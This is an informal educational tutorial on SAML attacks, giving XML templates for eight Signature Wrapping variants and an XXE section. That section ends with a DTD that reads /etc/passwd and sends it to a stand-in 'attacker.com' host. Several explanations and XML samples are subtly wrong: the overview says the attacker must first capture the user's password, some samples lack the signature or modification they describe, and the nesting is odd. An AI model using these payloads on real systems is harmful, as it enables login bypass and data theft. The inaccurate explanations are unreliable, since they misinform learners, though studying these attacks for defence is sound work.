# SAML Vulnerabilities

The first thing I have to say is that you should read it patiently as it is a very detailed and long subject. I know it's really long. However, since it is still used in some systems, your understanding will affect you positively and if you are a beginner, it may be a big deal for you. I am sure that if you work for a few hours without giving up, you will succeed and you will understand the subject. I would probably have created a simulation where you can try these vulnerabilities. From that part, you can reinforce your education with simulations. If you don't understand anything, go have a cup of coffee and come back and continue. Even though it is a subject that cannot be finished in one day, our brother Harsh Bothra has reserved a day for it. sorry :( good work

Note: I plan to design the simulations that will be required for the applications today, on a more free day in the future. I managed to write the content in 8 hours. Now I have to go and study the content more. By the way, if you do not know about this subject before, I recommend you to work on it by extending it to the next days. It will take 365 days again, but I can say that the content in the coming days is both less and easier than the content you will learn today.

## What is SAML?

First thing we need to learn today is what SAML is. SAML is an XML-based standard used for authentication and authorization. When properly configured as a SAML protocol, it allows you to securely share credentials and is commonly used in many single sign-on (SSO) applications. This prevents the user from signing in to multiple web applications separately and improves the user experience.

The SAML protocol consists of three key components:

- Identity Provider (IdP): The identity provider authenticates users and provides their credentials. When the user is authenticated, it creates a SAML assertion. This identity statement verifies that the user is authorized and has access to a particular service provider.
- Service Provider (SP): The service provider is the web application or resource server that provides the service that the user wants to access. The service provider accepts the user's SAML statement of identity, authenticates their credentials, and grants access to the user.
- User: A user is someone who wants to access web applications that use the SAML protocol. The user is directed to the identity provider for authentication and when the authentication is complete, they are directed to the service provider.

The SAML protocol uses various security mechanisms to ensure that authentication and authorization are performed securely. These include measures such as encrypting credentials, signing identity statements, and using secure communication channels.

SAML is a widely used protocol in enterprise applications, cloud services and integration of systems of different organizations. It improves user experience and security with single sign-on and secure authentication mechanisms.

however, in some cases, SAML is configured incorrectly, resulting in critical vulnerabilities, which we'll cover today.

## Let's take a closer look at SAML vulnerabilities

We will take a close look at the common security vulnerabilities caused by SAML and learn about their operation.

### Signature Wrapping (XSW) attacks

Signature Wrapping (XSW) attacks rely on a vulnerability in the SAML protocol. These attacks occur in the absence of XML Digital Signature (XML DSig) verification, which is used to establish trust between the identity provider (Identity Provider - IdP) and the service provider (Service Provider - SP).

XSW attacks allow an attacker to manipulate SAML assertions by altering or forging credentials. The attacker acts as an untrusted service provider and passes the SAML identity statement to the targeted SP. However, the attacker deceives the SP by changing the SAML credential or adding new credentials.

The attack may include the following steps:

- The attacker captures the user's credentials (for example, the username and password used to log into the identity provider).

- An attacker creates or modifies the SAML identity statement. The identity statement verifies that the user is authorized and has access to a particular SP.

- The attacker sends the SAML identity statement to the targeted SP. The identity statement implies that the attacker is an authorized user and must be trusted by the SP.

- The SP accepts the SAML statement of identity and processes it securely without verifying the user information in it.

The attacker's targeted SP, assuming the SAML assertion is valid, accepts the attacker's false identity statement and authorizes the attacker. This can lead to an attacker's abuse of privileges on the target SP, for example, privilege escalation, authentication exploitation, or denial of service.

These attack types are divided into 8 types. Normally I can point you to a link for you to read, but I was losing my mind while working on this topic before. That's why I wanted to tell you in a much more detailed and detailed way.

- XSW1 :// Applies to SAML Response messages. A cloned, unsigned copy of Response is appended immediately after the existing signature.
```
<Response xmlns="urn:oasis:names:tc:SAML:2.0:protocol" ID="_d71c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z" Destination="https://service -provider.com/acs">
<Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
<Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
<StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</Status>
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e44c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e44c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
<Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
<!-- Original Signature -->
</Signature>
</Assertion>
<Response>
<!-- Cloned, unsigned copy of Response -->
<Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
<Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
<StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</Status>
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>
</Response>
</Response>
```

Here I have added an XML that you may encounter in real life. What we're doing here is that we add another fake request after an original SAML Response request and send it. This domain we submit allows us to login with SSO if it is not controlled by the Service.

- XSW2 :// Applies to SAML Response messages. We need to append a cloned, unsigned copy of the response before the existing signature.

```
<Response xmlns="urn:oasis:names:tc:SAML:2.0:protocol" ID="_d71c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z" Destination="https://service -provider.com/acs">
<Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
<Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
<StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</Status>
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>
<!-- Cloned, unsigned copy of Response -->
<Response>
<Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
<Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
<StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</Status>
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>
</Response>
</Response>
```
In the above example, all SAML elements in the original Response were preserved and a cloned copy of Response was added unsigned. Both the original and cloned Response contain Assertions produced by the same identity provider. What we do here is to try to get authorization from SP by sending an unsigned response before the correct response and signature and to log in with SSO.

- XSW3 :// a cloned, unsigned copy of Assertion is inserted in front of the existing Assertion.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>
<!-- Cloned, unsigned copy of Assertion -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>
```
The XSW3 scenario happens in SAML Assertion messages. The attacker inserts a cloned and unsigned copy of Assertion in front of the existing Assertion. Thus, the SAML message is manipulated to contain multiple Assertions.

- XSW4 :// A cloned, unsigned copy of Assertion is inserted into the existing Assertion.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
<!-- Cloned, unsigned copy of Assertion -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>
</Assertion>
```
The XSW4 scenario happens in SAML Assertion messages. The attacker inserts a cloned and unsigned copy of Assertion into the existing Assertion. Thus, there is more than one Assertion in the existing Assertion and the attacker's powers are expanded.

- XSW5 :// replaces a value found in the signed copy and appends a copy of the original unsigned Assertion to the end of the SAML message.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>

<!-- Copy of Assertion modified for XSW5 scenario -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>

```
In the example SAML code above, a copy of the original Assertion is created and a new ID is assigned as `_e55c9c3e8e9f6744e6e8d18d5f7fdd5b` . The contents of this copy Assertion are replaced with a portion of the signed Assertion. The result is an unsigned copy with the original Assertion at the end of the SAML message. This allows the attacker to override and modify the signed Assertion.

- XSW6 :// replaces a value found in the copy of the signed Assertion and adds a copy of the original unsigned Assertion immediately after the signature. The attacker replaces a value found in the signed Assertion's copy. It then creates a copy containing the modified Assertion and appends that copy immediately after the signature. Finally, it creates a copy of the original unsigned Assertion and attaches that copy to the SAML message. In this way, the original Assertion may appear to be valid, while misleading the service provider accepting the signed Assertion containing the attacker's modified value.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>

<!-- Copy of Assertion modified for XSW6 scenario -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>

<!-- Unsigned copy of original Assertion -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>

```
In the example above, you can see that copies of Assertion are distinguished by the ID values `_e55c9c3e8e9f6744e6e8d18d5f7fdd5a` and `_e55c9c3e8e9f6744e6e8d18d5f7fdd5b` . The modified Assertion includes changes to the ID value as well as other XML fields. The attacker inserts this modified Assertion immediately after the signature, while inserting the original Assertion as an unsigned copy. Thus, even if the service provider will verify the signed Assertion, it accepts the modified Assertion and performs the attacker's manipulation.

- XSW7 :// is accomplished by adding an "Extensions" block containing an unsigned Assertion, cloned into a SAML Assertion message. This way, the attacker adds his manipulated Assertion to the SAML message along with the original Assertion.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
<Extensions>
<!-- Cloned, unsigned Assertion -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">evluser@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>
</Extensions>
<Signature>
<!-- Signature information is located here -->
</Signature>
</Assertion>

```
In the above example, there is the cloned Assertion ( distinguished by the ID value `_e55c9c3e8e9f6744e6e8d18d5f7fdd5a` ) placed in the Extensions block. This Assertion may contain the information that the attacker manipulated and the identity statement he requested. The service provider accepts the Assertion in the Extensions block and grants the attacker requested authorization and access rights.

- XSW8 :// is accomplished by adding an "Object" block containing an original unsigned copy Assertion. This way, the attacker can insert it directly into the SAML message without manipulating the original Assertion.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
<Object>
<!-- Unsigned copy of original Assertion -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5c" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
<Issuer>https://identity-provider.com</Issuer>
<Subject>
<NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
<SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
</SubjectConfirmation>
</Subject>
<Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
<AudienceRestriction>
<Audience>https://service-provider.com</Audience>
</AudienceRestriction>
</Conditions>
<AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
<AuthnContext>
<AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
</AuthnContext>
</AuthnStatement>
</Assertion>
</Object>
<Signature>
<!-- Signature information is located here -->
</Signature>
</Assertion>
```
In the example above, the cloned Assertion (distinguished by the ID value _e55c9c3e8e9f6744e6e8d18d5f7fdd5c) placed inside the "Object" block contains an unsigned copy of the original Assertion. In this way, the service provider accepts the original Assertion while not verifying its signature, and accepts the attacker's manipulated Assertion as well.

< h3 > < b > Yes, we have left the XSW Attacks behind. I am aware that it can be a very confusing subject, it wants to load the brain very quickly. The way you do this would be to sit down and rewrite the properties of all XSW~ attack variants one by one with pencil and paper, using pencil and paper, if you read this far and forgot what you read at the beginning. Yes, even if there is a burp extension called `SAML Raider` that does this, it is important to know how these vulnerabilities work so that you can find something special. Remember, even if a bug bounter naturally uses tools, you must be able to do everything you do with the tool manually and develop your own tools in order to truly learn the work and create value. </ b ></ h3 >

## XML Attack

can occur due to insufficient input validation and DTD (Document Type Definition) processing when a SAML application processes XML data. There are two main types of attacks: XXE (XML External Entity) attacks and XML DoS (Denial of Service) attacks.

**XXE Attacks** : XXE attacks aim to expose sensitive information or infect the server using an XML processor's processing of external entities. These attacks occur when XML data containing DTD is analyzed.
An attacker could attack the SAML application with a malicious XML file. When processing XML data, the application processes external entities and reads the values of these external entities. Using external entities, an attacker can access local files, attack other targets on the network, or expose sensitive data. For example, an attacker could use the "file://" protocol as an external entity to gain access to files on the system.

**XML DoS Attacks (Billian Laugh Attack)** : XML DoS attacks aim to cause service disruption in a system with large, complex or badly formatted XML data. These attacks cause the XML processor on the target system to consume resources.
Billian Laugh Attack is a common XML DoS attack, especially in SAML applications. Attackers format an XML file in such a way that it takes a long time to decode by the processor and causes excessive resource consumption. In this case, the system cannot perform its normal functionality as it is overloaded due to the attacker's creative formatting and service interruption occurs.

This vulnerability could allow malicious attackers to exploit the SAML implementation and access sensitive data on the system or cause service disruption. To counter such attacks, measures should be taken, such as strengthening input validation, disabling DTD processing, or using secure XML processors.

Now I will inform you about these types of attacks. The thing to remember is that this is not a complete solution. New types of attacks are discovered every day, and attack surfaces are constantly changing. Here I aim to lay the groundwork for you.

<hr> _ _

### Let's take a look at Attack Types

Here I will describe the types of attacks that I know. There may be a possibility that I have special shortcomings for today. You can PR or open an issue to fix them. I will create scenarios about the attack types that I will describe and give code examples.
<hr> _ _

**Internal Subset Attack** : An attacker can access sensitive system information by creating a DTD content subset with <!ENTITY> declarations:

Scenario: First of all, I'm not going to tell you to type nonsense xxe on <!ENTITY and it will magically return /etc/passwd directly on the screen. You can go and find this anywhere on the internet. We're going to attack the default vulnerable SAML a little differently.

- An attacker generates malicious XML content to send to the target SAML service.

- The XML content includes a DTD (Document Type Definition) as follows:

```
<!DOCTYPE root [
<!ENTITY % internalSubset SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%internalSubset;'>">
%payload;
%internalSubset;
]>
This DTD defines a subset of content and creates two external entities (%internalSubset and %payload).
```

- External entity %internalSubset points to "file:///etc/passwd". This is where the attacker wants to obtain the contents of the /etc/passwd file.

- External entity %payload creates an external entity named exfil, and its content is "http://attacker.com/?data=%internalSubset;" redirects to address. Here, the value of the external entity %internalSubset is used.

- Attacker uses external entities %payload and %internalSubset inside XML content: ` <root></root> `

- The attacker sends the prepared XML content to the target SAML service.

- The target SAML service analyzes the DTD when processing incoming XML content.

- External entities (%payload and %internalSubset) defined in the DTD are processed. As a result of this process, an external entity named exfil is defined and the contents of the /etc/passwd file are obtained by referencing the external entity %internalSubset.

